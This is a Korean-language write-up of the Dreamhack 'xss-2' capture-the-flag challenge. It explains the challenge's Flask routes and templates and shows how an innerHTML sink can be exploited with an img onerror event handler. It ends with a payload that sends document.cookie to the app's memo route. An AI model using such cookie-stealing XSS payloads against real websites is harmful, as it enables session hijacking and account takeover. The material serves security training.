# [Dreamhack] xss-2 풀이

## 사이트 구성
### 1. /
사이트의 루트 페이지로 코드는 아래와 같다
```python
@app.route("/")
def index():
    return render_template("index.html")
```
xss-1과는 다르게 index.html 템플릿을 랜더링 한다 즉 해당 사이트에서 모든것을 구성 하는 것이 아닌 템플릿에 이동 시켜 처리하는 방식이다.

#### index.html
```html
{% extends "base.html" %}
{% block title %}Index{% endblock %}

{% block head %}
  {{ super() }}
  <style type="text/css">
    .important { color: #336699; }
  </style>
{% endblock %}

{% block content %}
  <p class="important"><a href="/vuln?param=<script>alert(1)</script>">vuln(xss) page</a></p>
  <p class="important"><a href="/memo?memo=hello">memo</a></p>
  <p class="important"><a href="/flag">flag</a></p>
{% endblock %}
```
block content에는 각각의 라우트(vuln, memo, flag)로 연결하는 역할을 한다.

### 2. /vuln
```python
@app.route("/vuln")
def vuln():
    return render_template("vuln.html")
```
/vuln 라우트도 / 라우트와 동일하게 vuln.html 템플릿으로 랜더링 역할만 한다

#### vuln.html
```html
{% extends "base.html" %}
{% block title %}Index{% endblock %}

{% block head %}
  {{ super() }}
  <style type="text/css">
    .important { color: #336699; }
  </style>
{% endblock %}

{% block content %}
    <div id='vuln'></div>
    <script>var x=new URLSearchParams(location.search); document.getElementById('vuln').innerHTML = x.get('param');</script>
{% endblock %}
```
```html
var x = new URLSearchParams(location.search); document.getElementById('vuln').innerHTML = x.get('param');</script>

```
이 코드는 x라는 변수에 현재 웹 브라우저 주소창에서 물음표(?) 뒤에 오는 파라미터 값(예: ?param=hello)을 통째로 가져와서 그대로 출력한다
(기존의 xss-1 문제의 구동방식과 동일)

### 3. /memo
```python
@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)
```

기존의 memo 라우트와 달라진 점은 없다

### 4. /flag
```python
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'
```
memo와 마찬가지로 xss-1과 같다

##문제 풀이 방법
xss-1은 주소의 파라미터에 삽입된 스크립트를 그대로 실행하는 반면에 xss-2는 innerhtml에 <script>를 사용하면 동작 하지 않게 되어있다.
따라서 eventhandler을 사용해서 우회 해야 한다 ex)<img onerror>
```html
<img src=x onerror="alert(1)">
```
 를 vuln 라우트에서 실행 하면 alert(1)이 실행된다.

## 페이로드

```html
<img src= x onerror = "location.href='/memo?memo='+document.cookie">
```
